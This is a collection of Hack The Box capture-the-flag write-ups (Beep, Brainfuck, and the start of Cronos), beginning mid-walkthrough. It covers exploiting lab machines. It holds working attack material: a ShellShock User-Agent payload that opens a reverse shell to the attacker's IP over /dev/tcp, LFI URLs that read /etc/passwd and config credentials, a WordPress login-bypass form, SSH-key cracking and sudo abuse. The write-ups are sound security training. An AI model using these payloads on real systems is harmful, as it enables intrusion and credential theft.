I get an SSL unsupported protocol error. I tried fixing the error by changing the [python code](https://stackoverflow.com/questions/19268548/python-ignore-certificate-validation-urllib2), however, I couldn’t get it to work. Therefore, the next best solution is to have it go through Burp.

First, change the url parameter from “https” to “http” and the rhost to “localhost”. Next, in Burp go to **Proxy** &gt; **Options** &gt; **Proxy Listeners** &gt; **Add**. In the **Binding** tab, set the port to **80**. In the **Request handling** tab set the **Redirect to host** parameter to **10.10.10.7**, **Redirect to port** parameter to **443** and check the option **Force use of SSL**.

What that does is it redirects localhost to https://10.10.10.7 while passing all the requests and responses through Burp. This way the python script doesn’t have to handle HTTPS and therefore we avoid the SSL error we are getting.

Let’s try running it again.

```text
python 18650.py
```

It runs but we don’t get a shell back. The nice thing about doing this with Burp is that we can see the request & response. In Burp go to **Proxy** &gt; **HTTP history** and click on the request. In the **Request** tab, right click and send it to repeater. As can be seen, the error message we get is as follows.

![](https://miro.medium.com/max/1432/1*UQ9g04Zki82KQwu_hFOaFQ.png)

This might have to do with the default extension value in the script. We don’t actually know if the value 1000 is a valid extension. To figure that out, we’ll have to use the [SIPVicious security tools](https://github.com/EnableSecurity/sipvicious). In particular, the svwar tool identifies working extension lines on a PBX. Let’s run that tool to enumerate valid extensions.

```text
python svwar.py -m INVITE -e100-500 10.10.10.7
```

* **-m:** specifies a request method
* **-e:** specifies an extension or extension range

We get back the following result.

```text
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
| Extension | Authentication |
------------------------------
| 233       | reqauth        |
```

233 is a valid extension number. Change the extension in the script and run it again.

![](https://miro.medium.com/max/642/1*lA5njfKGfSQF7JHh1vlpIA.png)

We have a shell! Let’s first upgrade the shell to a partially interactive bash shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

‌To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Now that we have a fully interactive shell, let’s grab the user.txt flag.

![](https://miro.medium.com/max/520/1*7VIfyBV6EjSFA-_ULdGvvw.png)

Next, we need to escalate our privileges to root. Run the following command to view the list of allowed sudo commands the user can run.

```text
sudo -l
```

We get back the following result.

```text
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

Oh boy, so many security misconfigurations! For this solution, let’s exploit the chmod command.

Run the following command to give everyone rwx permissions on the /root directory.

```text
sudo chmod o+rwx /root
```

Now we can view the root.txt flag.

![](https://miro.medium.com/max/519/1*8_RP2_tUaZYeEUtTbHrXyA.png)

## Solution \#2 <a id="e66c"></a>

This solution involves attacking port 443.

First, transfer the LFI exploit to the attack machine.

```text
searchsploit -m 37637.pl
```

Looking at the exploit, it seems that the LFI vulnerability is in the **current\_language** parameter. Let’s see if our application is vulnerable to it.

```text
https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

We get back the following page.

![](https://miro.medium.com/max/1304/1*wkY_cdz3zNoiGsD2AU4w5Q.png)

The application is definitely vulnerable. Right click on the page and select View Page Source to format the page.

The file seems to have a bunch of usernames and passwords of which one is particularly interesting.

```text
# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```

Let’s try to use the above credentials to SSH into the admin account.

```text
ssh admin@10.10.10.7
```

It doesn’t work. To narrow down the number of things we should try, let’s use the LFI vulnerability to get the list of users on the machine.

```text
https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

After filtering through the results, these are the ones I can use.

```text
root:x:0:0:root:/root:/bin/bash                                                                                                                                                
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash                                                                                                                            
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash                                                                                                                        
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash                                                                                                               
spamfilter:x:500:500::/home/spamfilter:/bin/bash                                                                                                                               
fanis:x:501:501::/home/fanis:/bin/bash
```

Let’s try SSH-ing into the root account with the credentials we found above.

```text
ssh root@10.10.10.7
```

It worked!

![](https://miro.medium.com/max/651/1*g7i14OVF8Rp-c0r_dGVMlw.png)

For this solution, we don’t have to escalate privileges since we’re already root.

## Solution \#3 <a id="d238"></a>

This solution involves attacking port 10000.

First, visit the webmin application.

![](https://miro.medium.com/max/672/1*oCpETnw1MCmo6XcOBTgaZQ.png)

Then intercept the request in Burp and send it to Repeater. Change the User Agent field to the following string.

```text
() { :;}; bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
```

What that does is it exploits the ShellShock vulnerability and sends a reverse shell back to our attack machine. If you’re not familiar with ShellShock, the following [image](http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell) explains it really well.

![](https://miro.medium.com/max/1040/1*MEtlJTZNx7OzBnFdxk2Jsw.png)

Set up a listener to receive the reverse shell.

```text
nc -nlvp 4444
```

Send the request and we get a shell!

![](https://miro.medium.com/max/532/1*Y_Hmq66arpwddDzAhnVqeQ.png)

For this solution we also don’t need to escalate privileges since we’re already root!

## Conclusion <a id="b323"></a>

I presented three ways of rooting the machine. I know of at least two other way \(not presented in this writeup\) to root the machine including a neat solution by [ippsec](https://www.youtube.com/watch?v=XJmBpOd__N8) that involves sending a malicious email to a user of the machine and then executing that email using the LFI vulnerability we exploited in solution \#2. I’m sure there are also many other ways that I didn’t think of.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
brainfuck-writeup-w-o-metasploit.md
# Brainfuck Writeup w/o Metasploit

![](https://miro.medium.com/max/589/1*V_l8yAtapsmpj5EQMjykAQ.png)

## Reconnaissance

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.17
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that five ports are open:

* **Port 22:** running OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
* **Port 25**: running Postfix smtpd
* **Port 110:** running Dovecot pop3d
* **Ports 143**: running Dovecot imapd
* **Ports 443:** running nginx 1.10.0

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-25 09:49 EST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.00% done; ETC: 09:50 (0:00:04 remaining)
Nmap scan report for 10.10.10.17
Host is up (0.043s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA SASL(PLAIN) TOP RESP-CODES USER AUTH-RESP-CODE PIPELINING UIDL
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS more have OK LITERAL+ ENABLE IMAP4rev1 AUTH=PLAINA0001 capabilities SASL-IR IDLE listed ID post-login Pre-login
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.02 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.17
```

No other ports are open. Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.17
```

We get back the following result showing that no ports are open.

![](https://miro.medium.com/max/603/1*xVLoPfU5qH0EkxfHjMwm8Q.png)

Before we move on to enumeration, let’s make a few mental notes about the nmap scan results.

1. The version of SSH being used is not associated with any critical vulnerabilities, so port 22 is unlikely to be our point of entry. We’ll need credentials for this service.
2. Port 443 is running HTTPS. The index page gives us the title “Welcome to nginx!”. This is likely a configuration issue where the IP address doesn’t know what hostname it should map to in order to serve a specific site and so instead it’s serving the ngnix default page. To fix this issue we’ll need to first figure out the list of hostnames that resolve to this IP address and then add these hostnames to our /etc/hosts file. From the nmap scan, we get three possible hostnames: _brainfuck.htb_, _www.brainfuck.htb_ and _sup3rs3cr3t.brainfuck.htb_.
3. Ports 25, 143 and 110 are running mail protocols. We might need to find a valid email address to further enumerate these services.

## Enumeration <a id="c56e"></a>

Add the following hostnames to the /etc/hosts file on your attack machine.

```text
10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb 
```

I always start off with enumerating HTTP first. In this case only port 443 is open so we’ll start there.

First, let’s visit the site brainfuck.htb. After adding a security exception, we get the following page.

![](https://miro.medium.com/max/1290/1*uBZcjukec6C3JayNeUtrvw.png)

This is a WordPress site and we all know that WordPress is associated with SO MANY vulnerabilities. However, before we run a WordPress vulnerability scanner on this site, let’s look at the certificate information to see if it leaks any useful information.

To do that, click on the lock icon &gt; _Show Connection Details_.

![](https://miro.medium.com/max/490/1*tzW9MOgUTKdHpF43241Hxg.png)

Then click _More Information_ &gt; _View Certificate &gt; Details_. There, we see that the Issuer field gives us the email address _orestis@brainfuck.htb_ that might be useful when enumerating the open mail protocol ports. This email can also be found on the website.

![](https://miro.medium.com/max/719/1*QR68ixAbUoS_L4m9lM4ipA.png)

Next, let’s run the WordPress vulnerability scanner on the site.

```text
wpscan --url https://brainfuck.htb --disable-tls-checks --api-token <redacted>
```

* — url: The URL of the blog to scan.
* — disable-tls-checks: Disables SSL/TLS certificate verification.
* — api-token: The WPVulnDB API Token to display vulnerability data

The following is a summary of the results found by the wpscan.

* The WordPress version identified is 4.7.3.
* The identified version of WordPress contains 44 vulnerabilities.
* The WP Support Plus Responsive Ticket System plugin is installed.
* The identified version of WP Support Plus Responsive Ticket System plugin contains 4 vulnerabilities.

Out of all the vulnerabilities identified, one particular vulnerability does stand out.

```text
| [!] Title: WP Support Plus Responsive Ticket System <= 8.0.7 - Remote Code Execution (RCE)
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8949
 |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
```

I tried this vulnerability, however, it did not work out. So, let’s check if searchsploit generates any other vulnerabilities.

```text
searchsploit WP Support Plus Responsive Ticket System
```

We get back the following result.

![](https://miro.medium.com/max/1024/1*hHOalT9gd7Tt71t8Yj-XzQ.png)

Let’s look at the privilege escalation vulnerability.

![](https://miro.medium.com/max/901/1*FuyPbBpoq3KILosW-cwvmw.png)

According to the [documentation](https://www.exploit-db.com/exploits/41006), this vulnerability allows you to bypass authentication by logging in as anyone without knowing the password. You do however need a valid username for the attack to work. Therefore, let’s use wpscan to enumerate usernames.

```text
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
```

* — enumerate u: enumerates usernames.

We get back the following result.

![](https://miro.medium.com/max/693/1*oFCbC1_fHjFvRZ4YJzv_uw.png)

Both “_admin_” and “_administrator_” are valid usernames. Now that we have a valid username, let’s attempt to exploit the vulnerability.

## Gaining an Initial Foothold <a id="eb5f"></a>

Copy the POC code from the [vulnerability entry on searchsploit](https://www.exploit-db.com/exploits/41006) and save it in the file priv-esc.html. Change the URL to the name of the machine.

```text
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

Get the location of the exploit file on the attack machine.

```text
pwd
```

Run it in the browser and login as administrator.

![](https://miro.medium.com/max/718/1*lnJ63NNJB861XeZAE00F4A.png)

Refresh the brainfuck.htb page and we’re logged in as administrator!

![](https://miro.medium.com/max/1185/1*oubRE_dfw9h0fyaZSlHl9g.png)

There doesn’t seem to be much functionality available for this user. Therefore, let’s try the ‘admin’ user next. Perform the same exploit again except with the username being ‘admin’.

![](https://miro.medium.com/max/1160/1*WyKHJp2o-HJVy9g0EM1TCw.png)

On the top tab click on _Brainfuck Ltd._ &gt; _Themes_. Then click on _Plugins &gt; Settings_ on the _Easy WP SMTP_ plugin_._ There, we find the SMTP configuration settings with the SMTP username and SMTP masked password.

![](https://miro.medium.com/max/631/1*Wj4-jBDO92ewbYG3tpe2MQ.png)

Right click on the password field and view page source.

![](https://miro.medium.com/max/729/1*jTG8eUYGpAKG_wlfPI5nFw.png)

The user’s password is kHGuERB29DNiNE. Let’s use the mail client Evolution to log into orestis’s email. If you don’t have Evolution installed on your kali, you can install it using the following command.

```text
sudo apt-get install evolution
```

Open up the Evolution mail client. Click on _File_ &gt; _New_ &gt; _Mail Account_. On the _Welcome_ page click _Next_. There, enter the name _orestis_ in the _Full Name_ field and _orestis@brainfuck.htb_ in the _Email Address_ field.

![](https://miro.medium.com/max/825/1*8cfk_zqsdwrVajKlxbmlQg.png)

Click _Next_. In the _Receiving Email_ window, add _brainfuck.htb_ as the _Server_, _143_ as the _Port_ and _orestis_ as the _Username_.

![](https://miro.medium.com/max/827/1*LWH8GoJ6cC1D_pbc9xuB-g.png)

Click _Next &gt; Next._ In the _Sending Email_ window, add _brainfuck.htb_ as the _Server_, _25_ as the _Port_ and _No encryption_ as the _Encryption method_.

![](https://miro.medium.com/max/832/1*O7O_-dNp-671U28OoVGYoA.png)

Click _Next_ &gt; _Next_. You’ll be prompted with an authentication request. Add the password _kHGuERB29DNiNE_ and click _OK_. Now we can see orestis’s mail!

![](https://miro.medium.com/max/1117/1*49MexmwK9EaX34SZfn1JMA.png)

The _Form Access Details_ email gives us another set of credentials.

![](https://miro.medium.com/max/600/1*q7VcbUijHJjh9z2Wt9VKVA.png)

Remember that in the enumeration phase, we had three hostnames that we added to our hosts file. Since the email mentions a “secret” forum, let’s check out the sup3rs3cr3t.brainfuck.htb website. On the website, when you click on Log In, you’re presented with a login page. Enter our newly found credentials there.

![](https://miro.medium.com/max/801/1*6WieDPUQ4ebBEW2DaME_aA.png)

We’re logged in as orestis! Click on the _SSH Access_ thread.

![](https://miro.medium.com/max/1178/1*a4wJVzPvdlsjwy6G5U10eQ.png)

Based on the comments made there, orestis seems to have lost his SSH key and wants the admin to send it to him on an encrypted thread. One other thing we notice is that orestis always signs his message with the “Orestis — Hacking for fun and profit” phrase.

![](https://miro.medium.com/max/1096/1*xJcgP9jfUteJvFsnz4Fs8g.png)

The encrypted thread orestis is referencing is the _Key_ thread.

![](https://miro.medium.com/max/857/1*ZZV91p34QU61Qe83GFHJbw.png)

There, you’ll notice that orestis’s comments are signed with the same message we saw above except the message is in encrypted form. However, with each comment, the generated cipher text for the phrase is different. Therefore, the admin might be using the [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) which is a variation of a Caesar substitution cipher that uses a keyword and repeats it until it matches the length of the plaintext. Then the equivalent letter of the keyword is used to encrypt its corresponding plaintext letter. Therefore, the same plaintext can generate multiple different cipher texts.

Since we do have the plaintext and its corresponding cipher text, we can deduce the key since this cipher is vulnerable to a known plaintext attack. This [page](https://crypto.stackexchange.com/questions/12195/find-the-key-to-a-vigen%C3%A8re-cipher-given-known-ciphertext-and-plaintext) explains it really well, therefore I won’t explain how to do it.

I wrote a python script to automate the process of finding the key.

```text
plaintext = "OrestisHackingforfunandprofit"
ciphertext = "PieagnmJkoijegnbwzwxmlegrwsnn"
key = ""for i in range(len(plaintext)):
 num_key = ((ord(ciphertext[i]) - ord(plaintext[i])) % 26) + 97
 char_key = chr(num_key)
 key = key + char_keyprint key
```

The script loops through the cipher text string and takes each character in order and converts it to the integer representation of that character. Then it subtracts that value from the integer representation of the corresponding character in the plaintext string and applies the modulus of 26 since there are 26 alphabets. This gives you a value between 0 and 25 inclusive. However, since the “chr” function that turns an integer to its character value depends on the ASCII table where 97 represents “a”, 98 represents “b”, etc. I had to add 97 to the integer value. After it loops through the entire cipher text it prints the key.

Let’s run the script.

```text
python vigenere-key.py
```

We get back the following result.

```text
brainfuckmybrainfuckmybrainfu
```

As mentioned earlier, the Vigenère cipher uses a keyword and repeats it until it matches the length of the plaintext. Therefore, we can deduce that the key is _fuckmybrain_. Now that we have the key, we can use it to decrypt the admin’s statement using this [online tool](https://www.dcode.fr/vigenere-cipher).

```text
Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg :)mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
```

We get back the following text.

```text
There you go you stupid fuck, I hope you remember your key password because I dont :)
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

We’re one step closer! We have a link to the RSA private key that seems to be encrypted since the admin mentions a “key password” in the comment. Visit the link to download the RSA key. We get back the following encrypted key.

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
```

Before we use John the Ripper \(JtR\) to crack the password used to encrypt the private key, we need to convert the file into JtR format. To do that I use the [sshng2john.py](https://github.com/stricture/hashstack-server-plugin-jtr/blob/master/scrapers/sshng2john.py) script.

```text
python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa > ~/Desktop/htb/brainfuck/ssh-key
```

Now we can use JtR to crack the password.

```text
john ssh-key --wordlist=/usr/share/wordlists/rockyou.txt
```

We get back the following result.

```text
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (/root/Desktop/htb/brainfuck/id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:12 DONE (2019-12-26 16:53) 0.08223g/s 1179Kp/s 1179Kc/s 1179KC/sa6_123..*7¡Vamos!
Session completed
```

It cracked the password! Let’s use the key and password to SSH into orestis’s machine.

First change the permissions on the encrypted RSA private key.

```text
chmod 600 id_rsa
```

Then SSH into the machine.

```text
ssh -i id_rsa orestis@brainfuck.htb
```

We finally gained an initial foothold!

![](https://miro.medium.com/max/676/1*tm0f760_eE_He2ZNOLGBLQ.png)

Grab the user.txt flag.

![](https://miro.medium.com/max/470/1*Qp_AiRIKHm0FFQdpu3SAjA.png)

We need to escalate privileges.

## Privilege Escalation <a id="2617"></a>

List the files in orestis’s home directory.

```text
orestis@brainfuck:~$ ls -la
total 60
drwxr-xr-x 7 orestis orestis 4096 Apr 29  2017 .
drwxr-xr-x 3 root    root    4096 Apr 13  2017 ..
-rw------- 1 root    root       1 Dec 24  2017 .bash_history
-rw-r--r-- 1 orestis orestis  220 Apr 13  2017 .bash_logout
-rw-r--r-- 1 orestis orestis 3771 Apr 13  2017 .bashrc
drwx------ 2 orestis orestis 4096 Apr 29  2017 .cache
drwxr-xr-x 3 root    root    4096 Apr 17  2017 .composer
-rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
-rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
-rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
-rw-r--r-- 1 orestis orestis  655 Apr 13  2017 .profile
drwx------ 8 orestis orestis 4096 Apr 29  2017 .sage
drwx------ 2 orestis orestis 4096 Apr 17  2017 .ssh
-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt
```

View the content of encrypt.sage.

```text
orestis@brainfuck:~$ cat encrypt.sage
nbits = 1024password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

It seems to be performing RSA encryption. First, it opens the root.txt file and uses its value as a parameter in the encryption. The encrypted password is written in the output.txt file. It also logs parameters in the debug.txt file.

Parameters p, q and e are logged in the debug file which we have read/write access to. Since we have both p and q, we can calculate n=p\*q, phi=\(p-1\)\(q-1\). We also have c since it’s written in the output.txt file which we have read/write access to. So we can calculate m from the equation c = pow\(m,e,n\).

Instead of doing that by hand, someone already [wrote a script](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e) for it. First modify the script to include our values.

```text
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, ydef main():p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182# compute n
    n = p * q# Compute phi(n)
    phi = (p - 1) * (q - 1)# Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = aprint( "n:  " + str(d) );# Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )# Added code
flag = hex(pt)
flag = str(flag[2:-1])
print flag.decode("hex")if __name__ == "__main__":
    main()
```

I also added code that converts the string to ASCII. Run the script.

```text
python rsa-attack.py
```

The output gives you the content of the root.txt file.

```text
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977pt: 246040520294013860499802969537842870790592458678809669442466628493415070037506ef****************************** #redacted
```

## Lessons Learned <a id="1468"></a>

To gain an initial foothold on the box we exploited five vulnerabilities.

1. A known vulnerability in the WordPress version that is being used to host the website. This could have been easily avoided if the patched version was installed.
2. A password saved in the SMTP configuration settings. Although the password is masked, the plaintext password can be easily viewed in the source code. If the configuration settings does not require that the password be saved on the website, then the user should clear the password and enter the password every time they use the service.
3. A password stored in plaintext in the email. Again, if it is necessary that the password be transmitted by email, the user should have been prompted to change the password upon the first login.
4. The forums used the Vigenère Cipher which is known to be vulnerable to a known plaintext attack. Since we had both the cipher text and the corresponding plaintext, we were able to figure out the encryption key.
5. A weak password was used to encrypt the RSA private key. Since the password was really weak, it only took JtR a couple of seconds to decrypt it. The user should have used a sufficiently long password that is difficult to crack. Similarly, the user should have used a password manager to store the RSA private key instead of having to ask the admin to post it on the website.

To escalate privileges I exploited one vulnerability.

1. A file that was executed by root was used to encrypt the root.txt file using the RSA algorithm. However, the file outputted the “p”, “q” and “e” parameters used in the RSA encryption and therefore we were able to decrypt the cipher text. So this technically exploited two vulnerabilities: \(1\) sensitive information disclosure of RSA parameters and \(2\) security misconfiguration that gave a non-privileged user the ability to read the debug.txt file which contained sensitive information.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
cronos-writeup-w-o-metasploit.md
# Cronos Writeup w/o Metasploit

![](https://miro.medium.com/max/582/1*_PG12EejjSTDQVUQTLWWvw.png)

## Reconnaissance <a id="bbd0"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.13
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
